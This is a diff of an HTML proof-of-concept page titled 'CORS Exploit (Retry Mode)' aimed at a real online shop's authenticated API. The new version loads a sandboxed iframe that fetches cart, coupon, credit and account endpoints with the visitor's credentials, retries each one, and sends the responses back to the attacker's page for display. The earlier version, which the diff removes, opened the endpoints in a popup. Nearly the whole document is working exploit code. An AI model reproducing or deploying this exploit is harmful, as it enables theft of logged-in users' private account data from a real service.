@@ -1,60 +1,158 @@
+<!DOCTYPE html>
 <html>
+<head>
+<meta charset="UTF-8">
+<title>CORS Exploit (Retry Mode)</title>
+</head>
+
 <body>
 
-<h2>OPPO Authenticated API Exposure PoC</h2>
+<h2>CORS Exploit (Retry Mode)</h2>
 
 <button onclick="runExploit()">Run Exploit</button>
+
+<iframe
+id="sandboxFrame"
+sandbox="allow-scripts allow-storage-access-by-user-activation"
+style="display:none">
+</iframe>
+
+<pre id="output">Waiting...</pre>
 
 <script>
 
 const endpoints = [
 
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-
-"https://www.opposhop.cn/cn/oapi/credits/web/credits/show",
-
-"https://www.opposhop.cn/cn/oapi/users/web/address/list",
-
-"https://www.opposhop.cn/cn/oapi/users/web/member/info"
+"/cn/oapi/orders/web/cart/v1/list",
+"/cn/oapi/orders/web/cart/getCount",
+"/cn/oapi/users/web/coupons/count?state=1",
+"/cn/oapi/users/web/credits/getUserCredit",
+"/cn/oapi/credits/web/credits/show"
 
 ];
 
-let i = 0;
-let attackWindow = null;
+const MAX_RETRIES = 5;
 
-function runExploit() {
+function runExploit()
+{
 
-attackWindow = window.open("about:blank");
+document.getElementById("output").innerText =
+"Starting exploit...\n";
 
-nextStep();
+let frame =
+document.getElementById("sandboxFrame");
 
+frame.srcdoc = `
+
+<script>
+
+const endpoints = ${JSON.stringify(endpoints)};
+
+const MAX_RETRIES = ${MAX_RETRIES};
+
+async function testEndpoint(endpoint)
+{
+
+for(let i=1;i<=MAX_RETRIES;i++)
+{
+
+try
+{
+
+let r = await fetch(
+"https://www.opposhop.cn" + endpoint + "?r=" + Math.random(),
+{
+credentials:"include"
 }
+);
 
-function nextStep() {
+let data = await r.text();
 
-if(i >= endpoints.length){
+if(data.length > 0)
+{
 
-alert("Exploit finished");
+parent.postMessage(
+{
+endpoint:endpoint,
+data:data,
+tries:i
+},
+"*"
+);
 
 return;
 
 }
 
-attackWindow.location = endpoints[i];
-
-console.log("Opening:", endpoints[i]);
-
-i++;
-
-setTimeout(nextStep, 3500);
+}
+catch(e){}
 
 }
+
+parent.postMessage(
+{
+endpoint:endpoint,
+data:"FAILED",
+tries:MAX_RETRIES
+},
+"*"
+);
+
+}
+
+async function run()
+{
+
+for(let ep of endpoints)
+{
+
+await testEndpoint(ep);
+
+}
+
+}
+
+run();
+
+<\/script>
+
+`;
+
+}
+
+window.addEventListener("message", e =>
+{
+
+let msg = e.data;
+
+let output =
+document.getElementById("output");
+
+if(msg.data === "FAILED")
+{
+
+output.innerText +=
+"\n❌ FAILED after " +
+msg.tries +
+" tries: " +
+msg.endpoint;
+
+}
+else
+{
+
+output.innerText +=
+"\n✅ SUCCESS after " +
+msg.tries +
+" tries: " +
+msg.endpoint +
+"\n" +
+msg.data +
+"\n";
+
+}
+
+});
 
 </script>
 
